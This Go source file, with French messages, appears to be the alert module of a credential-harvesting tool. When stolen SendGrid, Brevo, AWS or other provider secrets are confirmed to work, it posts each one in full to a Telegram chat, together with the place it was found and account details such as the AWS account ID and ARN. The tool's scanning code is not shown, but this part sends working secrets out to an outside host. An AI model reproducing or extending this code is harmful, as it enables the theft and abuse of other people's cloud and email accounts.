package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	telegramOnce   sync.Once
	telegramBot    string
	telegramChat   string
	telegramReady  bool
	telegramDedupe sync.Map
)

func loadTelegramFromEnv() {
	telegramOnce.Do(func() {
		telegramBot = strings.TrimSpace(os.Getenv("TELEGRAM_BOT_TOKEN"))
		telegramChat = strings.TrimSpace(os.Getenv("TELEGRAM_CHAT_ID"))
		if telegramBot != "" && telegramChat != "" {
			telegramReady = true
		}
	})
}

func shouldNotifyDedupe(key string) bool {
	if key == "" {
		return true
	}
	if _, loaded := telegramDedupe.LoadOrStore(key, struct{}{}); loaded {
		return false
	}
	return true
}

func sendTelegramMessage(text string) error {
	loadTelegramFromEnv()
	if !telegramReady {
		return fmt.Errorf("telegram: définir TELEGRAM_BOT_TOKEN et TELEGRAM_CHAT_ID")
	}
	endpoint := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", url.PathEscape(telegramBot))
	form := url.Values{}
	form.Set("chat_id", telegramChat)
	form.Set("text", text)
	form.Set("parse_mode", "HTML")
	form.Set("disable_web_page_preview", "true")

	ctx, cancel := context.WithTimeout(context.Background(), 25*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, "POST", endpoint, strings.NewReader(form.Encode()))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram HTTP %d: %s", resp.StatusCode, string(body))
	}
	var tr struct {
		OK     bool   `json:"ok"`
		ErrStr string `json:"description"`
	}
	_ = json.Unmarshal(body, &tr)
	if !tr.OK {
		return fmt.Errorf("telegram: %s", tr.ErrStr)
	}
	return nil
}

func notifyTelegramHit(title string, lines []string) {
	loadTelegramFromEnv()
	if !telegramReady {
		return
	}
	var b strings.Builder
	b.WriteString(title)
	b.WriteString("\n")
	for _, ln := range lines {
		b.WriteString(ln)
		b.WriteString("\n")
	}
	msg := b.String()
	if len(msg) > 4000 {
		msg = msg[:3990] + "\n…"
	}
	if err := sendTelegramMessage(msg); err != nil {
		fmt.Printf("[-] %sTelegram: %v%s\n", Yellow, err, Reset)
	}
}

func notifySendGridValid(source, apiKey, quota, rawJSON string) {
	key := "sg:" + hashShort(apiKey)
	if !shouldNotifyDedupe(key) {
		return
	}
	title := "✅ <b>SendGrid — clé VALIDÉE</b> 📧"
	lines := []string{
		fmt.Sprintf("📍 <b>Source</b>: <code>%s</code>", escapeHTML(truncateForTG(source, 500))),
		fmt.Sprintf("🔑 <b>Clé</b>: <code>%s</code>", escapeHTML(apiKey)),
		fmt.Sprintf("📊 <b>Quota / crédits</b>: %s", escapeHTML(truncateForTG(quota, 400))),
		fmt.Sprintf("📄 <b>API</b>: %s", escapeHTML(truncateForTG(rawJSON, 800))),
	}
	notifyTelegramHit(title, lines)
}

func notifyBrevoValid(source, apiKey, quota, rawJSON string) {
	key := "brevo:" + hashShort(apiKey)
	if !shouldNotifyDedupe(key) {
		return
	}
	title := "✅ <b>Brevo — clé VALIDÉE</b> 💙"
	lines := []string{
		fmt.Sprintf("📍 <b>Source</b>: <code>%s</code>", escapeHTML(truncateForTG(source, 500))),
		fmt.Sprintf("🔑 <b>Clé</b>: <code>%s</code>", escapeHTML(apiKey)),
		fmt.Sprintf("📊 <b>Quota / compte</b>: %s", escapeHTML(truncateForTG(quota, 400))),
		fmt.Sprintf("📄 <b>API</b>: %s", escapeHTML(truncateForTG(rawJSON, 800))),
	}
	notifyTelegramHit(title, lines)
}

func notifyAWSValid(source, accessKey, secretKey, region, arn, account, userID, allRegionsTried string) {
	key := "aws:" + hashShort(accessKey+":"+secretKey)
	if !shouldNotifyDedupe(key) {
		return
	}
	title := "✅ <b>AWS — accès VALIDÉ</b> ☁️🔐"
	lines := []string{
		fmt.Sprintf("📍 <b>Source</b>: <code>%s</code>", escapeHTML(truncateForTG(source, 500))),
		fmt.Sprintf("🌍 <b>Région STS OK</b>: <code>%s</code>", escapeHTML(region)),
		fmt.Sprintf("🔑 <b>Access Key ID</b>: <code>%s</code>", escapeHTML(accessKey)),
		fmt.Sprintf("🔐 <b>Secret</b>: <code>%s</code>", escapeHTML(secretKey)),
		fmt.Sprintf("🆔 <b>Account</b>: <code>%s</code>", escapeHTML(account)),
		fmt.Sprintf("👤 <b>UserId</b>: <code>%s</code>", escapeHTML(userID)),
		fmt.Sprintf("📎 <b>ARN</b>: <code>%s</code>", escapeHTML(truncateForTG(arn, 500))),
		fmt.Sprintf("🧭 <b>Régions testées (liste)</b>: %s", escapeHTML(truncateForTG(allRegionsTried, 300))),
	}
	notifyTelegramHit(title, lines)
}

func notifyProviderValid(service, source, secretOrKey, extra string) {
	key := service + ":" + hashShort(secretOrKey)
	if !shouldNotifyDedupe(key) {
		return
	}
	title := fmt.Sprintf("✅ <b>%s — VALIDÉ</b> ✨", escapeHTML(service))
	lines := []string{
		fmt.Sprintf("📍 <b>Source</b>: <code>%s</code>", escapeHTML(truncateForTG(source, 500))),
		fmt.Sprintf("🔑 <b>Secret / clé</b>: <code>%s</code>", escapeHTML(truncateForTG(secretOrKey, 200))),
		fmt.Sprintf("📄 <b>Détail</b>: %s", escapeHTML(truncateForTG(extra, 900))),
	}
	notifyTelegramHit(title, lines)
}

func escapeHTML(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	return s
}

func truncateForTG(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

func hashShort(s string) string {
	h := uint32(2166136261)
	for i := 0; i < len(s); i++ {
		h ^= uint32(s[i])
		h *= 16777619
	}
	return fmt.Sprintf("%08x", h)
}
